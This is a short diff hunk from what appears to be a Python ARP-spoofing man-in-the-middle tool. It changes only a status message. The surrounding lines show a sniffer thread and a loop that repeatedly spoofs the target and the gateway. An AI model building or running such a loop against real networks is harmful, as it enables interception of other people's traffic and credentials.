@@ -147,7 +147,7 @@ if __name__ == "__main__":
     sniffer_thread = Thread(target=sniff_packets, daemon=True)
     sniffer_thread.start()
 
-    print(f"{Fore.GREEN}[*] Starting MITM attack on {target_ip}, Press Ctrl+C to pause 🚀")
+    print(f"\n{Fore.GREEN}[*] Starting MITM attack on {target_ip}, Press Ctrl+C to pause 🚀")
     while True:
         spoof(target_ip, gateway_ip, target_mac, attacker_mac)
         spoof(gateway_ip, target_ip, router_mac, target_mac)
